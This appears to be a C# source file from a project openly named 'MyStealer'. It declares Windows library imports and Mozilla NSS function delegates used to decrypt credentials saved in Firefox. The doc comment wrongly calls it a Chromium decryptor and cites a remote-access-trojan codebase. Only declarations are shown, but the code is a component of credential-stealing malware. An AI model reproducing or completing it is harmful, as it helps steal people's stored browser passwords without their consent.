using System;
using System.Runtime.InteropServices;

namespace MyStealer.Decryptor
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials.
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs
    /// </summary>
    public partial class MozillaDecryptor
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr Pk11GetInternalKeySlot();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void Pk11FreeSlot(IntPtr slot);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11NeedLogin(IntPtr slot);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11CheckUserPassword(IntPtr slot, string password);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void SECItemZfreeItem(ref TSECItem data, int n);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int PortGetError();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr PrErrorToName(int code);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr PrErrorToString(int code, uint locale);

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }
    }
}
